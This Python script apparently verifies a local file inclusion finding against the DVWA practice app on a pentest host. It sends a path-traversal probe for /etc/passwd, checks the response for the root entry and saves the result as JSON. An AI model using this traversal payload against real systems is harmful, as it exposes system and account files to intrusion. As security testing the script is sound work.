import json
import time
from pathlib import Path
import httpx

BASE = "https://pentest-ground.com:4280/vulnerabilities/fi/"


def fetch(client, page):
    started = time.perf_counter()
    try:
        response = client.get(BASE, params={"page": page})
        return {
            "status": response.status_code,
            "elapsed": round(time.perf_counter() - started, 4),
            "size": len(response.content),
            "content_type": response.headers.get("content-type", ""),
            "body": response.text,
            "error": None,
        }
    except httpx.HTTPError as exc:
        return {"status": 0, "elapsed": round(time.perf_counter() - started, 4), "size": 0, "content_type": "", "body": "", "error": str(exc)}


def main():
    with httpx.Client(timeout=45, follow_redirects=True, headers={"User-Agent": "APISecurityPlatform-IndependentVerification/1.0"}) as client:
        control = fetch(client, "include.php")
        probe = fetch(client, "../../../../../../etc/passwd")
    result = {
        "control": {k: v for k, v in control.items() if k != "body"},
        "probe": {k: v for k, v in probe.items() if k != "body"},
        "passwd_marker_present": "root:x:0:0:" in probe["body"],
        "probe_contains_passwd_header": "root:" in probe["body"],
        "response_size_delta": probe["size"] - control["size"],
    }
    Path("tests/dvwa_lfi_manual_results.json").write_text(json.dumps(result, indent=2) + "\n")
    print(json.dumps(result, indent=2))


if __name__ == "__main__":
    main()
